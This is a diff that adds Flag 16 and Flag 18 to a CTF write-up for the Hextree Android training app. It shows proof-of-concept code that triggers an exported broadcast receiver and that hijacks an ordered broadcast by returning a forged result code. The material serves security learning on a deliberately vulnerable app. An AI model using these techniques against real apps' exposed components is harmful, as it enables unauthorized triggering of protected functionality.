@@ -557,3 +557,228 @@ Here, the `outer` Intent targets `Flag5Activity` and contains the `middle` Inten
 Once the button was clicked, all the required conditions were satisfied and `Flag5Activity` returned the flag.
 
 Flag : `HXT{intent-in-intent-in-intent-298abso}`
+
+# Broadcast Receivers
+
+# Flag 16 — Basic Exposed Receiver
+
+[svg](https://github.com/Abhijith-P-B/write-up/tree/main/Hextree#flag-16--basic-exposed-receiver)
+
+After opening the application in **JADX**, I started by looking at `Flag16Activity`. The description pointed me towards `Flag16Receiver`, so I opened the receiver to understand how it could be triggered.
+
+I found that `Flag16Receiver` extends `BroadcastReceiver`:
+
+```java
+public class Flag16Receiver extends BroadcastReceiver {
+    public static String FlagSecret = "give-flag-16";
+
+    @Override
+    public void onReceive(Context context, Intent intent) {
+        Log.i("Flag16Receiver.onReceive", Utils.dumpIntent(context, intent));
+        if (intent.getStringExtra("flag").equals(FlagSecret)) {
+            success(context, FlagSecret);
+        }
+    }
+}
+```
+
+The important part was:
+
+```java
+intent.getStringExtra("flag")
+```
+
+This showed that the receiver expects an extra named `flag`. I then checked the value of `FlagSecret`:
+
+```java
+public static String FlagSecret = "give-flag-16";
+```
+
+So I needed to send an Intent containing:
+
+```text
+flag=give-flag-16
+```
+
+Since this was a `BroadcastReceiver`, I knew I needed to use `sendBroadcast()` rather than `startActivity()`.
+
+I then checked the application's `AndroidManifest.xml` and found:
+
+```xml
+<receiver
+    android:name="io.hextree.attacksurface.receivers.Flag16Receiver"
+    android:enabled="true"
+    android:exported="true"/>
+```
+
+The important part was:
+
+```xml
+android:exported="true"
+```
+
+This meant that the receiver was exposed and could be accessed by another application, including my PoC application.
+
+I created an explicit broadcast in my PoC app and targeted the receiver directly:
+
+```java
+Intent intent = new Intent();
+
+intent.setComponent(new ComponentName(
+        "io.hextree.attacksurface",
+        "io.hextree.attacksurface.receivers.Flag16Receiver"
+));
+
+intent.putExtra("flag", "give-flag-16");
+
+sendBroadcast(intent);
+```
+
+Here, `setComponent()` specifies the exact receiver that should receive the broadcast:
+
+```text
+io.hextree.attacksurface.receivers.Flag16Receiver
+```
+
+I then used `putExtra()` to provide the value expected by the receiver:
+
+```text
+flag = give-flag-16
+```
+
+Finally, `sendBroadcast()` sent the Intent to the exposed receiver.
+
+I checked Logcat using:
+
+```bash
+adb logcat | grep "Flag16Receiver"
+```
+
+The logs showed that the broadcast reached the receiver and that the correct extra was received:
+
+```text
+09-14 15:49:43.622  3146  3146 I Flag16Receiver.onReceive: [Component] ComponentInfo{io.hextree.attacksurface/io.hextree.attacksurface.receivers.Flag16Receiver}
+09-14 15:49:43.622  3146  3146 I Flag16Receiver.onReceive: [Extra:'flag']: give-flag-16
+```
+
+Since `give-flag-16` matched `FlagSecret`, the condition in `onReceive()` was satisfied and the receiver's `success()` method was executed.
+
+The receiver then printed the generated flag to Logcat:
+
+```text
+09-14 15:49:43.649  3146  3146 I Flag16Receiver: Flag: HXT{basic-receiver-ds82s}
+```
+
+**Flag:** `HXT{basic-receiver-ds82s}`
+
+# Flag 18 — Hijacking Broadcast Intent
+
+[svg](https://github.com/Abhijith-P-B/write-up/tree/main/Hextree#flag-18--hijacking-broadcast-intent)
+
+After opening the application in **JADX**, I went to `Flag18Activity` and looked at what happens inside `onCreate()`.
+
+I found that the activity creates a broadcast with the action:
+
+```java
+Intent intent = new Intent("io.hextree.broadcast.FREE_FLAG");
+```
+
+It also adds a `flag` extra and sends the Intent using `sendOrderedBroadcast()`:
+
+```java
+intent.putExtra("flag", this.f.appendLog(this.flag));
+intent.addFlags(8);
+
+sendOrderedBroadcast(intent, null, new BroadcastReceiver() {
+    @Override
+    public void onReceive(Context context, Intent intent2) {
+        String resultData = getResultData();
+        Bundle resultExtras = getResultExtras(false);
+        int resultCode = getResultCode();
+
+        Log.i("Flag18Activity.BroadcastReceiver", "resultData " + resultData);
+        Log.i("Flag18Activity.BroadcastReceiver", "resultExtras " + resultExtras);
+        Log.i("Flag18Activity.BroadcastReceiver", "resultCode " + resultCode);
+
+        if (resultCode != 0) {
+            Utils.showIntentDialog(context, "BroadcastReceiver.onReceive", intent2);
+            Flag18Activity flag18Activity = Flag18Activity.this;
+            flag18Activity.success(flag18Activity);
+        }
+    }
+}, null, 0, null, null);
+```
+
+Since the broadcast only specifies an action and does not target a particular application, I could register my own receiver for `io.hextree.broadcast.FREE_FLAG`.
+
+The interesting part was that the target checks the result returned from the broadcast:
+
+```java
+int resultCode = getResultCode();
+
+if (resultCode != 0) {
+    ...
+    flag18Activity.success(flag18Activity);
+}
+```
+
+There was no validation of where that result came from. I could therefore make my receiver return a non-zero result code.
+
+I created a `Flag18Receiver` in my PoC application:
+
+```java
+public class Flag18Receiver extends BroadcastReceiver {
+
+    @Override
+    public void onReceive(Context context, Intent intent) {
+
+        Log.i("Flag18Receiver", "Received FREE_FLAG");
+
+        setResultCode(1);
+    }
+}
+```
+
+Then I registered it dynamically in my `Main_Hextree` activity:
+
+```java
+BroadcastReceiver receiver = new Flag18Receiver();
+
+IntentFilter filter =
+        new IntentFilter("io.hextree.broadcast.FREE_FLAG");
+
+registerReceiver(
+        receiver,
+        filter,
+        Context.RECEIVER_EXPORTED
+);
+```
+
+I initially tried to launch `Flag18Activity` directly from my PoC, but this failed because the activity was declared as:
+
+```xml
+android:exported="false"
+```
+
+So instead, I started my PoC app first and registered the receiver. I then opened **Flag 18 through the Hextree application itself**.
+
+When `Flag18Activity` started, it sent the `FREE_FLAG` ordered broadcast. My receiver caught it and executed:
+
+```java
+setResultCode(1);
+```
+
+This caused the receiver inside `Flag18Activity` to get a result code of `1`. Since the application checks:
+
+```java
+if (resultCode != 0)
+```
+
+the condition was satisfied and the success function was called.
+
+The flag was then displayed:
+
+```text
+Flag: HXT{hijacking-broadcast-intent-as91}
+```
+
